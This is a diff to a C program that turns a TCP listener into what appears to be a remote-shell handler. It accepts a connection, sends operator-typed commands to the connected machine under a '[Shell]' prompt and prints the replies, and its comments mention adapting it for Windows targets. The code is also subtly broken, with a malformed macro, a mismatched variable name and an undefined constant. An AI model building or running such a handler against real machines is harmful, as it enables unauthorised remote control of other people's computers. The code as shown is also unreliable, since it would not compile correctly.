@@ -8,6 +8,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#define bzeroWin(p, size) (void) memset((p), 0, (size))
 #define CONN_AMNT = 5
 
 int main() {
@@ -37,4 +38,24 @@ int main() {
 	listen(sock, CONN_AMNT);
     clientLength = sizeof(clientAddress);
 	clientSocket = accept(sock, (struct sockaddr *) &clientAddress, &clientLength);
+
+    while (TRUE) {
+        bzero(&buffer, sizeof(buffer));
+		bzero(&response, sizeof(response));
+        // adaption for windows mchine
+        // bzeroWin(&buffer, sizeof(buffer));
+		// bzeroWin(&response, sizeof(response));
+		printf("[Shell]#%s~$: ", inet_ntoa(client_address.sin_addr));
+		fgets(buffer, sizeof(buffer), stdin);
+        strtok(buffer, "\n");
+		write(clientSocket, buffer, sizeof(buffer));
+
+        if (strncmp("q", buffer, 1) == 0) {
+			break;
+            // WSACleanup();
+		} else {
+			recv(clientSocket, response, sizeof(response), MSG_WAITALL);
+			printf("%s", response);
+		}
+    }
 }
